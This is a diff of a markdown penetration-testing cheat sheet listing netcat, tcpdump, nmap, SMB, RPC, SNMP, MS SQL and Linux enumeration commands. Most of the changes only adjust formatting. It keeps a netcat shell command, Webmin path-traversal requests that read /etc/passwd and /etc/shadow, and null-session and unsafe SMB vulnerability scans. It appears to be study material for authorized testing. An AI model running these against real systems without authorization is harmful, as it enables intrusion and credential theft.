@@ -127,16 +127,13 @@ Kali Linux
 
 -   Netcat - Read and write TCP and UDP Packets
 
-    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
+    -   Netcat for Windows
         [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)
-
-    -   Connect to a POP3 mail server  
-        `nc -nv $ip 110`
 
     -   Listen on TCP/UDP port  
         `nc -nlvp 4444`
 
-    -   Connect to a netcat port  
+    -   Connect to a  port  
         `nc -nv $ip 4444`
 
     -   Send a file using netcat  
@@ -164,7 +161,6 @@ Kali Linux
         `nc -nv $ip 4444 -e /bin/bash`
         
     -   Netcat for Banner Grabbing:
-    
         `echo "" | nc -nv -w1 <IP Address> <Ports>`
 
 -   Ncat - Netcat for Nmap project which provides more security avoid
@@ -178,16 +174,12 @@ Kali Linux
 
 
 -   Tcpdump
-
     -   Display a pcap file  
        `tcpdump -r passwordz.pcap`
-
     -   Display ips and filter and sort  
         `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`
-
     -   Grab a packet capture on port 80  
         `tcpdump tcp port 80 -w output.pcap -i eth0`
-
     -   Check for ACK or PSH flag set in a TCP packet  
         `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`
 
@@ -226,14 +218,12 @@ Information Gathering & Vulnerability Scanning
 -   Passive Information Gathering
     ---------------------------------------------------------------------------------------------------------------------------
 
-
 -   Email Harvesting
 
-    -   Theharvester
-        `theharvester -d site.com -b google`
+ -   Theharvester
+    `theharvester -d site.com -b google`
 
 -   Netcraft
-
     -   Determine the operating system and tools used to build a site  
         https://searchdns.netcraft.com/
 
@@ -267,8 +257,6 @@ Information Gathering & Vulnerability Scanning
      `nc -nvv -w 1 -z $ip 3388-3390`
      
  
-
-
 -   Enumeration
     -----------
 
@@ -277,9 +265,6 @@ Information Gathering & Vulnerability Scanning
     -   `nc -v $ip 25`
     -   `telnet $ip 25`
     -   `nc TARGET-IP 80`
-
-
-
 
 
 -   DNS Enumeration
@@ -321,8 +306,9 @@ Information Gathering & Vulnerability Scanning
 
 -   NMap Enumeration Script List:
 
-
-
+    -   Nmap List all scripts installed  
+        `ls -l /usr/share/nmap/scripts/`
+        
     -   Nmap port version detection MAXIMUM power  
         `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`
 
@@ -333,10 +319,8 @@ Information Gathering & Vulnerability Scanning
         `nmap -sV --script=nfs-showmount $ip`
 
 -   RPC (Remote Procedure Call) Enumeration
-
     -   Connect to an RPC share without a username and password and enumerate privledges
         `rpcclient --user="" --command=enumprivs -N $ip`
-
     -   Connect to an RPC share with a username and enumerate privledges
         `rpcclient --user="<Username>" --command=enumprivs $ip`
 
@@ -345,7 +329,6 @@ Information Gathering & Vulnerability Scanning
 
     -   SMB OS Discovery  
         `nmap $ip --script smb-os-discovery.nse`
-
     -   Nmap port scan  
         `nmap -v -p 139,445 -oG smb.txt $ip-254`
 
@@ -360,21 +343,15 @@ Information Gathering & Vulnerability Scanning
         `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
 
     -   Nmap all SMB scripts authenticated scan
-    
-        `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
+         `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
 
     -   SMB Enumeration Tools  
         `nmblookup -A $ip  `
-        
         `smbclient //MOUNT/share -I $ip -N  `
-        
         `rpcclient -U "" $ip  `
-        
         `enum4linux $ip  `
-        
         `enum4linux -a $ip`
         
-
     -   SMB Finger Printing  
         `smbclient -L //$ip`
 
@@ -384,8 +361,7 @@ Information Gathering & Vulnerability Scanning
     -   Nmap scans for vulnerable SMB Servers  
         `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`
 
-    -   Nmap List all SMB scripts installed  
-        `ls -l /usr/share/nmap/scripts/smb*`
+
 
     -   Enumerate SMB Users
     
@@ -400,9 +376,7 @@ Information Gathering & Vulnerability Scanning
         `ridenum.py $ip 500 50000 dict.txt`
 
     -   Manual Null Session Testing
-    
         Windows: `net use \\$ip\IPC$ "" /u:""`
-        
         Linux: `smbclient -L //$ip`
         
 
@@ -444,16 +418,15 @@ Information Gathering & Vulnerability Scanning
         `echo "" > /etc/snmp/snmp.conf`
 
     -   SNMP Enumeration Commands
-
-        -   `snmpcheck -t $ip -c public`
-
-        -   `snmpwalk -c public -v1 $ip 1|`
-
-        -   `grep hrSWRunName|cut -d\* \* -f`
-
-        -   `snmpenum -t $ip`
-
-        -   `onesixtyone -c names -i hosts`
+        ```echo public > community
+        for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
+        onesixtyone -c community -i ips
+        ```
+        `snmpcheck -t $ip -c public` 
+        or 
+        `for ip in $(cat snmp_hosts); do snmp-check $ip ; done`
+        `snmpwalk -c public -v1 $ip 1|`
+        `snmpenum -t $ip`
 
     -   SNMPv3 Enumeration  
         `nmap -sV -p 161 --script=snmp-info $ip/24`
@@ -467,19 +440,14 @@ Information Gathering & Vulnerability Scanning
 
 
 -   MS SQL Server Enumeration
-
     -   Nmap Information Gathering
-        
         `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`
         
 -   Webmin and miniserv/0.01 Enumeration - Port 10000
-
       Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
-        
         `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
         
       Test to see if webmin is running as root by grabbing /etc/shadow
-      
         `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
 
 -   Linux OS Enumeration
@@ -573,7 +541,6 @@ Information Gathering & Vulnerability Scanning
 -   File Enumeration
 
     -   Find UID 0 files root execution
-
     -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
 
     -   Get handy linux file system enumeration script (/var/tmp)  
